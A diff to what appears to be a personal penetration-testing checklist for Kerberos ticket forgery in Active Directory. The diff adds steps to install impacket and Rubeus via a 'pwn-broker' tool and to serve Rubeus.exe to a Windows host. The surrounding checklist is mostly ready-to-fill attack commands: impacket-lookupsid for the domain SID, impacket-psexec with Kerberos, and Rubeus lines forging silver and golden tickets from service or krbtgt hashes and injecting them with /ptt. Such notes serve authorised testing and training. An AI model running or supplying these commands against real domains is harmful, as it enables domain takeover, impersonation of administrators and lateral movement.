@@ -5,6 +5,7 @@ sudo ntpdate <DCIP>
 - [ ] KRB_AP_ERR_SKEW on any line below: the clock again, right before it
 - [ ] Silver needs one service account's NT hash and never touches the DC; golden, diamond and sapphire need the krbtgt key, which means I already own the domain
 - [ ] Each needs the domain SID: :Pb domain-enum, or the line below
+At the pwn-broker prompt: tool install impacket.
 impacket-lookupsid '<Domain>/<Username>:<Password>@<DCIP>'
 - [ ] Domain SID is S-1-5-21-...: that is <DomainSID>, without a trailing -<RID>
 
@@ -46,7 +47,13 @@ impacket-psexec -k -no-pass '<Domain>/administrator@<DCHost>'
 - [ ] -impersonate pulls the real PAC, so I name no groups myself: :Pb acl-abuse for the DCSync
 
 ## From a Windows shell
-Rubeus.exe from my own tools, into upload/ for serve. /ptt drops the ticket straight into my session.
+At the pwn-broker prompt:
+tool install rubeus
+serve
+serve files rubeus
+On the Windows host:
+- [ ] Rubeus.exe fetched with the line serve files gives
+/ptt drops the ticket straight into my session.
 .\Rubeus.exe silver /service:cifs/<Hostname>.<Domain> /rc4:THE-SERVICE-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
 .\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
 A diamond ticket, the Windows match for sapphire: edit a real TGT with the krbtgt AES key.
